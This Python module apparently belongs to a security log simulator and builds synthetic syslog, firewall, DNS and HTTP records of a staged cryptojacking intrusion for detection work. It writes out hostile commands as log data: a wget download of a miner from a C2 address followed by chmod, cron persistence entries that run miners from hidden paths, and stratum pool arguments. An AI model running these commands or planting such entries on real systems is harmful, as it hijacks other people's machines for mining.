from __future__ import annotations

from datetime import datetime

from ..formatters.json_fmt import JSONFormatter
from ..formatters.syslog_fmt import CiscoASAFormatter, SyslogFormatter
from ..topology import Topology
from .base import BaseCampaign

MINER_BINARIES = ["/tmp/.X11-unix/xmrig", "/var/tmp/.cache/kworker", "/dev/shm/.x/xmr"]
MINER_CONFIGS = ["-o stratum+tcp://{pool}:3333 -u 4", "-o stratum+ssl://{pool}:443 -u 8"]
CRON_ENTRIES = [
    "*/5 * * * * /var/tmp/.cache/kworker -c /var/tmp/.cache/config.json",
    "@reboot /dev/shm/.x/xmr --donate-level 0",
]


class CryptoJackCampaign(BaseCampaign):
    def __init__(self, topology: Topology) -> None:
        super().__init__(topology)
        self.syslog_fmt = SyslogFormatter()
        self.asa_fmt = CiscoASAFormatter()
        self.json_fmt = JSONFormatter()
        self._victim = topology.random_linux_host()

    @property
    def total_phases(self) -> int:
        return 4

    def _pick_pool(self):
        return self.rng.choice(self.topo.cryptojack_pools) if self.topo.cryptojack_pools else "pool.minexmr.com"

    def _pick_c2_ip(self):
        return self.rng.choice(self.topo.cryptojack_ips) if self.topo.cryptojack_ips else "104.238.222.60"

    def generate(self, ts: datetime) -> dict[str, list[str]]:
        phase = self.advance_phase()
        if phase == 0:
            return self._download_miner(ts)
        elif phase == 1:
            return self._cron_persistence(ts)
        elif phase == 2:
            return self._mining_connection(ts)
        else:
            return self._c2_beacon(ts)

    def _download_miner(self, ts):
        host = self._victim
        c2_ip = self._pick_c2_ip()
        pid = self.rng.randint(1000, 65000)
        binary = self.rng.choice(MINER_BINARIES)

        linux_lines = [
            self.syslog_fmt.format(
                ts, hostname=host.hostname, process="sudo", pid=pid,
                message=f"root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget -q -O {binary} http://{c2_ip}/x86_64",
            ),
            self.syslog_fmt.format(
                ts, hostname=host.hostname, process="sudo", pid=pid,
                message=f"root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x {binary}",
            ),
        ]

        http_data = {
            "bytes": self.rng.randint(500000, 3000000),
            "src_ip": host.ip,
            "src_port": self.topo.random_ephemeral_port(),
            "bytes_in": self.rng.randint(200, 500),
            "dest_ip": c2_ip,
            "dest_port": 80,
            "bytes_out": self.rng.randint(500000, 3000000),
            "time_taken": self.rng.randint(200000, 800000),
            "transport": "tcp",
            "flow_id": self.topo.random_guid(),
            "http_method": "GET",
            "status": 200,
            "uri_path": "/x86_64",
            "site": c2_ip,
            "http_user_agent": "Wget/1.21.2",
            "http_content_type": "application/octet-stream",
            "http_comment": "HTTP/1.1 200 OK",
            "server": "nginx",
            "protocol_stack": "ip:tcp:http",
        }
        http_line = self.json_fmt.format(ts, data=http_data)

        fw = self.topo.random_firewall()
        asa_line = self.asa_fmt.format(
            ts, hostname=fw.hostname, severity=6, message_id="302013",
            message=(
                f"Built outbound TCP connection {fw.next_conn_id()} for inside:{host.ip}/{self.topo.random_ephemeral_port()} "
                f"({host.ip}/{self.topo.random_ephemeral_port()}) to outside:{c2_ip}/80 ({c2_ip}/80)"
            ),
        )

        return {"linux_secure": linux_lines, "http": [http_line], "firewall": [asa_line]}

    def _cron_persistence(self, ts):
        host = self._victim
        pid = self.rng.randint(1000, 65000)
        cron_entry = self.rng.choice(CRON_ENTRIES)

        lines = [
            self.syslog_fmt.format(
                ts, hostname=host.hostname, process="sudo", pid=pid,
                message=f"root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -l",
            ),
            self.syslog_fmt.format(
                ts, hostname=host.hostname, process="crontab", pid=pid + 1,
                message=f"(root) REPLACE (root)",
            ),
            self.syslog_fmt.format(
                ts, hostname=host.hostname, process="crond", pid=self.rng.randint(100, 999),
                message=f"(root) CMD ({cron_entry.split(' ', 5)[-1]})",
            ),
        ]

        return {"linux_secure": lines}

    def _mining_connection(self, ts):
        host = self._victim
        pool = self._pick_pool()
        pool_ip = self._pick_c2_ip()
        port = self.rng.choice([3333, 3334, 5555, 14444, 45700])

        dns_data = {
            "host_addr": [pool_ip],
            "message_type": ["QUERY", "RESPONSE"],
            "name": [pool],
            "query": [pool],
            "query_type": ["A"],
            "reply_code": "NoError",
            "reply_code_id": 0,
            "response_time": self.rng.randint(5000, 20000),
            "transaction_id": self.rng.randint(1000, 65535),
            "ttl": [300],
            "bytes": self.rng.randint(80, 200),
            "src_ip": host.ip,
            "src_port": self.topo.random_ephemeral_port(),
            "bytes_in": 40,
            "dest_ip": self.topo.dns_server_ip,
            "dest_port": 53,
            "bytes_out": self.rng.randint(60, 150),
            "time_taken": self.rng.randint(5000, 20000),
            "transport": "udp",
            "flow_id": self.topo.random_guid(),
            "protocol_stack": "ip:udp:dns",
        }
        dns_line = self.json_fmt.format(ts, data=dns_data)

        fw = self.topo.random_firewall()
        asa_line = self.asa_fmt.format(
            ts, hostname=fw.hostname, severity=6, message_id="302013",
            message=(
                f"Built outbound TCP connection {fw.next_conn_id()} for inside:{host.ip}/{self.topo.random_ephemeral_port()} "
                f"({host.ip}/{self.topo.random_ephemeral_port()}) to outside:{pool_ip}/{port} ({pool_ip}/{port})"
            ),
        )

        return {"dns": [dns_line], "firewall": [asa_line]}

    def _c2_beacon(self, ts):
        host = self._victim
        c2_ip = self._pick_c2_ip()
        pid = self.rng.randint(1000, 65000)

        linux_line = self.syslog_fmt.format(
            ts, hostname=host.hostname, process="crond", pid=pid,
            message=f"(root) CMD (/var/tmp/.cache/kworker -c /var/tmp/.cache/config.json)",
        )

        fw = self.topo.random_firewall()
        asa_line = self.asa_fmt.format(
            ts, hostname=fw.hostname, severity=6, message_id="302013",
            message=(
                f"Built outbound TCP connection {fw.next_conn_id()} for inside:{host.ip}/{self.topo.random_ephemeral_port()} "
                f"({host.ip}/{self.topo.random_ephemeral_port()}) to outside:{c2_ip}/443 ({c2_ip}/443)"
            ),
        )

        return {"linux_secure": [linux_line], "firewall": [asa_line]}
